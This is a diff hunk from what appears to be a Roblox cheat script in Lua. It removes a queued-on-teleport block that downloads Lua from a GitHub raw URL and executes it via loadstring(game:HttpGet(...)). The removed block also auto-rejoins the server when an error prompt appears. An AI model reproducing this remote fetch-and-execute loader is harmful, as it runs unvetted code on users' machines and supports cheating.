@@ -35,13 +35,3 @@ local function findPlayer(name)
 					    print('lol ragequit')
 				end
 
-syn.queue_on_teleport([[
-getgenv().skid = "ballas"
-wait(10)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/qcox/gothoes/main/funny.php",true))()
-getgenv().rejoin = game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
-	if child.Name == 'ErrorPrompt' and child:FindFirstChild('MessageArea') and child.MessageArea:FindFirstChild("ErrorFrame") then
-        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)
-	end
-end)
-]])
